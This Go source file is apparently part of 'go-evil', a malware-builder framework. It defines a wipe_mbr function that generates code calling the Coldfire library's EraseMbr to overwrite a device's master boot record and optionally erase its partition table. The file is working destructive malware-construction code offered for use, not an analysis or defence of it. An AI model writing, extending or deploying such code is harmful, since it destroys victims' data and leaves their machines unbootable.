package system

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
	"github.com/TeamPhoneix/go-evil/utility/tools"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

// Tries to wipe the mbr
// Input is an evil array with the following format, ${"device", "erase partition table? (true/false)"}$
func wipe_mbr(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "wipe_mbr"
	arr := structure.Create_evil_object(value)

	if arr.Length() != 2 {
		notify.Error(fmt.Sprintf("Obtained evil array had size %d, but 2 was requested", arr.Length()), "system.move()")
	}

	device := arr.Get(0)
	wipe_partition_table := tools.String_to_boolean(arr.Get(1))

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(repr_1 []int, repr_2 bool){", function_call),
		"value1 := spine.variable.get(spine.alpha.construct_string(repr_1))",
		"err := coldfire.EraseMbr(value1, repr_2)",
		"if err != nil{",
		"spine.log(err.Error())",
		"}",
		"}"})

	data_object.Add_go_import("github.com/redcode-labs/Coldfire")

	parameter_1 := data_object.Generate_int_array_parameter(device)

	return []string{fmt.Sprintf("%s(%s, %t)", function_call, parameter_1, wipe_partition_table)}, structure.Send(data_object)
}
